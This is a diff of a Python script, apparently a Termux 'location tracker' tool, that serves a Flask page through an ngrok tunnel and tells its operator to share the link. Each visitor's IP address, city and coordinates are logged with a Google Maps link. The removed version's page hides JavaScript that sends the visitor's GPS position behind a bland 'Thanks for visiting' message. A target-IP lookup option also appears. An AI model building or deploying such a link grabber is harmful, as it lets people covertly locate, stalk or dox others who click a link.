@@ -1,224 +1,220 @@
-import requests
-import datetime
+#!/usr/bin/env python3
 import os
-import time
+import sys
 import subprocess
-import socket
-from flask import Flask, request, render_template_string
-from threading import Thread
+import threading
+import queue
+import webbrowser
+import time
+import json
+import shutil
+import platform
 
-app = Flask(__name__)
-PORT = None
-
-HTML_BASIC = """
-<!doctype html>
-<html><head><title>Welcome</title></head>
-<body><h2>Thanks for visiting</h2><p>Your IP has been logged.</p></body>
-</html>
-"""
-
-HTML_IMMEDIATE = """
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Accurate Location Tracker</title>
-</head>
-<body>
-  <h2>Thanks for visiting!</h2>
-  <p>Your IP has been logged.</p>
-  <script>
-    fetch("/log_ip", {method: "POST"}).catch(() => {});
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        function(position) {
-          fetch("/submit_location", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              latitude: position.coords.latitude,
-              longitude: position.coords.longitude,
-              accuracy: position.coords.accuracy
-            })
-          }).catch(() => {});
-        }
-      );
-    }
-  </script>
-</body>
-</html>
-"""
-
-def banner():
-    print("\033[92m" + """
-╔════════════════════════════════════════════╗
-║     Made by Mohimanul-TVM (Free Version)  ║
-╚════════════════════════════════════════════╝
-""" + "\033[0m")
-
-def get_location(ip):
+def ensure_pip():
     try:
-        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
-        data = res.json()
-        if data["status"] == "success":
-            return {
-                "IP": ip,
-                "City": data.get("city"),
-                "Region": data.get("regionName"),
-                "Country": data.get("country"),
-                "Latitude": data.get("lat"),
-                "Longitude": data.get("lon"),
-                "ISP": data.get("isp"),
-                "Map": f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}",
-                "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            }
-    except Exception as e:
-        return {"IP": ip, "Error": str(e)}
-    return {"IP": ip, "Error": "Unknown error"}
-
-@app.route('/')
-def index():
-    return render_template_string(HTML_BASIC)
-
-@app.route('/log_ip', methods=["POST"])
-def log_ip():
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    data = get_location(ip)
-    print("\n--- Immediate IP Captured ---")
-    for k, v in data.items():
-        print(f"{k}: {v}")
-    print("----------------------------\n")
-    return "IP logged"
-
-@app.route('/submit_location', methods=["POST"])
-def submit_location():
-    data = request.get_json()
-    lat = data.get("latitude")
-    lon = data.get("longitude")
-    accuracy = data.get("accuracy")
-
-    result = {
-        "method": "GPS",
-        "Latitude": lat,
-        "Longitude": lon,
-        "Accuracy (m)": accuracy,
-        "Map": f"https://www.google.com/maps?q={lat},{lon}",
-        "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    }
-
-    print("\n--- Accurate Location Captured (GPS) ---")
-    for k, v in result.items():
-        print(f"{k}: {v}")
-    print("----------------------------------------\n")
-
-    return "Location received!"
-
-@app.route('/immediate')
-def immediate():
-    return render_template_string(HTML_IMMEDIATE)
-
-def find_free_port():
-    with socket.socket() as s:
-        s.bind(('', 0))
-        return s.getsockname()[1]
-
-def download_ngrok():
-    if not os.path.isfile("ngrok"):
-        print("\033[93m[•] Downloading ngrok...\033[0m")
-        os.system("pkg install -y wget unzip")
-        os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
-        os.system("unzip ngrok.zip && rm ngrok.zip && chmod +x ngrok")
-
-def start_ngrok():
-    global PORT
-    PORT = find_free_port()
-    download_ngrok()
-    token = input("Enter your Ngrok Authtoken (required once): ").strip()
-    os.system(f"./ngrok authtoken {token}")
-    cmd = ["./ngrok", "http", str(PORT)]
-    print("\033[93m[•] Starting Ngrok tunnel...\033[0m")
-    ngrok_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    
-    # Retry fetching ngrok URL up to 10 times
-    public_url = None
-    for _ in range(10):
+        import pip
+    except ImportError:
+        print("[*] pip not found. Attempting to install...")
         try:
-            time.sleep(2)
-            tunnels = requests.get("http://127.0.0.1:4040/api/tunnels").json()
-            public_url = tunnels['tunnels'][0]['public_url']
-            print(f"\033[92m[✓] Ngrok public URL: {public_url}\033[0m")
+            subprocess.check_call([sys.executable, "-m", "ensurepip"])
+        except Exception:
+            print("[!] ensurepip not available. Trying get-pip.py...")
+            os.system("wget https://bootstrap.pypa.io/get-pip.py -O get-pip.py")
+            os.system(f"{sys.executable} get-pip.py")
+            os.remove("get-pip.py")
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip"])
+    except Exception:
+        print("[!] Warning: Could not upgrade pip.")
+
+ensure_pip()
+
+def install_and_import(package):
+    try:
+        __import__(package)
+    except ImportError:
+        print(f"[+] Installing {package}...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+
+for pkg in ["flask", "requests", "pyngrok"]:
+    install_and_import(pkg)
+
+import requests
+from flask import Flask, request
+from pyngrok import ngrok
+
+def install_ngrok_binary():
+    if shutil.which("ngrok") is not None:
+        return
+    print("[*] ngrok binary not found. Attempting to install...")
+    arch = platform.machine()
+    url = ""
+    if "aarch64" in arch or "arm" in arch.lower():
+        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm.zip"
+    elif "x86_64" in arch:
+        url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip"
+    else:
+        print("[!] Unknown architecture. Please install ngrok manually.")
+        return
+    try:
+        os.system(f"wget {url} -O ngrok.zip")
+        os.system("unzip ngrok.zip")
+        os.system("chmod +x ngrok")
+        os.system("mv ngrok $PREFIX/bin/")
+        os.remove("ngrok.zip")
+        print("[+] ngrok installed successfully!")
+    except Exception as e:
+        print(f"[!] Failed to install ngrok automatically: {e}")
+
+install_ngrok_binary()
+
+BANNER = """
+=====================================
+        Made by Mohimanul-TVM
+=====================================
+"""
+
+visitor_queue = queue.Queue()
+app = Flask(__name__)
+ngrok_tunnel = None
+
+def get_ip_geolocation(ip):
+    try:
+        url = f"https://ipinfo.io/{ip}/json"
+        res = requests.get(url, timeout=5)
+        res.raise_for_status()
+        data = res.json()
+        loc = data.get("loc", "")
+        latitude, longitude = ("", "")
+        if loc and "," in loc:
+            latitude, longitude = loc.split(",")
+        return {
+            "ip": data.get("ip", ip),
+            "city": data.get("city", "Unknown"),
+            "region": data.get("region", "Unknown"),
+            "country": data.get("country", "Unknown"),
+            "latitude": latitude,
+            "longitude": longitude
+        }
+    except (requests.RequestException, json.JSONDecodeError):
+        return {"ip": ip, "error": "Could not fetch location data"}
+
+def option_1_track_ip():
+    while True:
+        ip = input("\nEnter IP address to track (or 'back' to return): ").strip()
+        if ip.lower() == "back":
+            return
+        if not ip:
+            print("Please enter a valid IP.")
+            continue
+        print("[*] Querying location...")
+        info = get_ip_geolocation(ip)
+        print("\n--- IP Information ---")
+        for k, v in info.items():
+            print(f"{k.capitalize()}: {v}")
+        print("-----------------------\n")
+
+@app.route("/")
+def index():
+    visitor_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    location_data = get_ip_geolocation(visitor_ip)
+    visitor_queue.put(location_data)
+    html = f"""
+    <html>
+    <head><title>Location Tracker</title></head>
+    <body>
+    <h2>Welcome!</h2>
+    <p>Your IP: {visitor_ip}</p>
+    <p>Approximate Location:</p>
+    <ul>
+        <li>City: {location_data.get('city')}</li>
+        <li>Region: {location_data.get('region')}</li>
+        <li>Country: {location_data.get('country')}</li>
+        <li>Latitude: {location_data.get('latitude')}</li>
+        <li>Longitude: {location_data.get('longitude')}</li>
+    </ul>
+    <p>Thank you for visiting.</p>
+    </body>
+    </html>
+    """
+    return html
+
+def run_flask_server():
+    app.run(host="0.0.0.0", port=5000)
+
+def start_ngrok_tunnel():
+    ngrok.kill()
+    try:
+        authtoken = os.getenv("NGROK_AUTHTOKEN")
+        if authtoken:
+            ngrok.set_auth_token(authtoken)
+    except Exception:
+        pass
+    tunnel = ngrok.connect(5000)
+    return tunnel
+
+def option_2_public_tracker():
+    global ngrok_tunnel
+    flask_thread = threading.Thread(target=run_flask_server, daemon=True)
+    flask_thread.start()
+    print("[*] Starting ngrok tunnel...")
+    try:
+        ngrok_tunnel = start_ngrok_tunnel()
+    except Exception as e:
+        print(f"[!] Failed to start ngrok tunnel: {e}")
+        return
+    print(f"\n[+] Share this URL:\n\n    {ngrok_tunnel.public_url}\n")
+    while True:
+        try:
+            visitor = visitor_queue.get()
+            print("\n=== New Visitor ===")
+            for k, v in visitor.items():
+                print(f"{k.capitalize()}: {v}")
+            lat = visitor.get('latitude')
+            lon = visitor.get('longitude')
+            if lat and lon:
+                maps_url = f"https://www.google.com/maps?q={lat},{lon}"
+                print(f"\nGoogle Maps Link: {maps_url}")
+                choice = input("Open this location in your browser? (y/n): ").strip().lower()
+                if choice == "y":
+                    webbrowser.open(maps_url)
+            else:
+                print("No valid latitude/longitude.")
+            print("\n[*] Waiting for next visitor...\n")
+            time.sleep(0.1)
+        except KeyboardInterrupt:
+            print("\n[!] Interrupted. Shutting down...")
+            if ngrok_tunnel:
+                ngrok.disconnect(ngrok_tunnel.public_url)
+                ngrok.kill()
             break
         except Exception as e:
-            continue
-    if not public_url:
-        print("\033[91m[✗] Failed to get ngrok URL after multiple attempts.\033[0m")
-        ngrok_process.terminate()
-        return None, None
+            print(f"[!] Error: {e}")
 
-    return ngrok_process, public_url
-
-def run_flask():
-    app.run(host="0.0.0.0", port=PORT or 0)
-
-def ip_lookup():
-    ip = input("Enter target IP address: ").strip()
-    data = get_location(ip)
-    print("\n\033[96m--- IP Info ---\033[0m")
-    for k, v in data.items():
-        print(f"{k}: {v}")
-    print("\033[96m----------------\033[0m")
-
-def generate_link():
-    ngrok_process, url = start_ngrok()
-    if not url:
-        return
-    flask_thread = Thread(target=run_flask)
-    flask_thread.start()
-    print(f"\033[93m[•] Share this link: {url}/\033[0m")
-    try:
-        while flask_thread.is_alive():
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("\nTerminating...")
-        ngrok_process.terminate()
-        flask_thread.join()
-
-def immediate_ip_gps_option():
-    ngrok_process, url = start_ngrok()
-    if not url:
-        return
-    flask_thread = Thread(target=run_flask)
-    flask_thread.start()
-    print(f"\033[93m[•] Share this link: {url}/immediate\033[0m")
-    try:
-        while flask_thread.is_alive():
-            time.sleep(1)
-    except KeyboardInterrupt:
-        print("\nTerminating...")
-        ngrok_process.terminate()
-        flask_thread.join()
-
-def menu():
-    banner()
+def main_menu():
+    print(BANNER)
     while True:
-        print("\n\033[93m[1]\033[0m Track location using IP")
-        print("\033[93m[2]\033[0m Generate link & capture visitor IP (basic page)")
-        print("\033[93m[3]\033[0m Generate link & capture visitor IP immediately + GPS (advanced)")
-        print("\033[93m[0]\033[0m Exit")
-        choice = input("Select an option: ").strip()
-        if choice == '1':
-            ip_lookup()
-        elif choice == '2':
-            generate_link()
-        elif choice == '3':
-            immediate_ip_gps_option()
-        elif choice == '0':
-            print("Exiting...")
-            break
+        print("\nSelect an option:")
+        print("1) Track IP by input")
+        print("2) Generate public shareable URL to track visitors")
+        print("3) Exit")
+        choice = input("Enter choice (1/2/3): ").strip()
+        if choice == "1":
+            option_1_track_ip()
+        elif choice == "2":
+            option_2_public_tracker()
+        elif choice == "3":
+            print("\nGoodbye!\n")
+            sys.exit(0)
         else:
-            print("Invalid option.")
+            print("\nInvalid choice. Please try again.")
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     try:
-        menu()
-    except Exception as e:
-        print(f"\033[91m[✗] Error: {e}\033[0m")
+        main_menu()
+    except KeyboardInterrupt:
+        print("\nExiting gracefully. Goodbye!")
+        try:
+            ngrok.kill()
+        except Exception:
+            pass
